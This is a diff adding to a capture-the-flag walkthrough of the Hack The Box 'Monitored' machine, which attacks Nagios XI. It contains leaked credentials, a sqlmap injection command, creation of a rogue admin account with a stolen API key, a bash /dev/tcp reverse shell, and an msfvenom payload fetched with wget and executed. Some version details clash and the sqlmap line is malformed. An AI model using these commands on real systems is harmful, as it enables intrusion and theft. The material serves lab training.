@@ -593,11 +593,11 @@ dirb http://surveillance.htb/
 
 <figure><img src=".gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
 
-/etc/hosts
+#### /etc/hosts
 
 * sudo nano /etc/hosts
 
-website
+#### website
 
 <figure><img src=".gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>
 
@@ -608,21 +608,156 @@ website
     * not working
   * root:welcome
     * not working
+* Nagios subpage
+  * Nagios Core
+    * [https://nagios.monitored.htb/nagios/](https://nagios.monitored.htb/nagios/)
+    * v 4.4.13 Nagios XI
 
 ### Weaponisation
 
-
-
-snmpwalk
+#### snmpwalk
 
 sudo apt install snmp
 
+**`snmpwalk -v2c -c public monitored.htb`**
+
 <figure><img src=".gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
 
-* svc:
+<figure><img src=".gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+
+* svc:XjH7VCehowpR1xZB
+  * not working, but could be useful in the future
+* some user laurel
+* **Authentication via API for user svc**
+
+```
+curl -POST -k 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=500'
+```
+
+<figure><img src=".gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>
+
+OK, we obtained auth\_token of user svc
+
+* `cf6962b52462e86aceb1a17056adfd695e474034`
 
 ### Exploitation
 
+NagiosXI v4.4.13
+
+* CVE - VULN
+  * [https://nvd.nist.gov/vuln/detail/CVE-2023-40931](https://nvd.nist.gov/vuln/detail/CVE-2023-40931)
+  * A SQL injection vulnerability in Nagios XI from version 5.11.0 up to and including 5.11.1 allows authenticated attackers to execute arbitrary SQL commands via the ID parameter in the POST request to /nagiosxi/admin/banner\_message-ajaxhelper.php
+
+`sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'" --level 5 --risk 3 -p id --batch -D nagiosxi --dump`
+
+
+
+* The admin hash looks like bcrypt, but the API key is close
+* Using it, we will add a new user with administrator rights
+  * admin007 could sound cool
+
+```
+curl -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admin007&password=admin007&name=Admin007&email=admin007@localhost&auth_level=admin"
+```
+
+<figure><img src=".gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>
+
+LOGIN via admin007
+
+<figure><img src=".gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>
+
+Change PW of original admin
+
+* **`nagiosadmin:hacked`**
+* `SSH still not working...`
+
+<figure><img src=".gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
+
 ### User flag
 
+Gaining reverse shell access
+
+{% embed url="https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php" %}
+
+<figure><img src=".gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>
+
+* add new command
+  * [https://www.revshells.com/](https://www.revshells.com/)
+  * **`bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'`**
+  *
+
+      <figure><img src=".gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>
+
+
+  * Do not forget to click on Apply settings.&#x20;
+  * Go to our host **`https://nagios.monitored.htb/nagiosxi/includes/components/ccm/?cmd=modify&type=host&id=1&page=1&returnUrl=index.php%3Fcmd%3Dview%26type%3Dhost%26page%3D1`**&#x20;
+    * to the right, select our commands sequentially, then click Run command check.
+
+<figure><img src=".gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
+
 ### Root flag
+
+{% embed url="https://github.com/jakgibb/nagiosxi-root-rce-exploit" %}
+
+sudo -l
+
+<figure><img src=".gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
+
+`cd /usr/local/nagiosxi/scripts/components`
+
+`cat getprofile.sh`
+
+<figure><img src=".gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
+
+Let's check the rights of the /usr/local/nagios/etc/nagios.cfg file:
+
+```
+ls -la /usr/local/nagios/etc/nagios.cfg 
+```
+
+<figure><img src=".gitbook/assets/image (113).png" alt=""><figcaption><p>we can edit this file</p></figcaption></figure>
+
+We correct the log\_file parameter as follows:
+
+
+
+#### Reverse TCP to obtain profile.zip file
+
+```
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=9000 -f elf -o meterpreter_payload.elf
+```
+
+<figure><img src=".gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>
+
+```
+python3 -m http.server 8081 
+```
+
+<figure><img src=".gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>
+
+```
+wget http://10.10.14.8:8081/meterpreter_payload.elf -O /tmp/s && chmod +x /tmp/s && /tmp/s
+```
+
+<figure><img src=".gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>
+
+Now let's start the backup:
+
+```
+sudo /usr/local/nagiosxi/scripts/components/getprofile.sh 1
+```
+
+<figure><img src=".gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
+
+After execution, you should see the file /usr/local/nagiosxi/var/components/profile.zip, which you should unzip and find the file nagios-logs/nagios.txt, which will contain the **root user's private key.** Let's save it and log in.
+
+#### SSH login as root
+
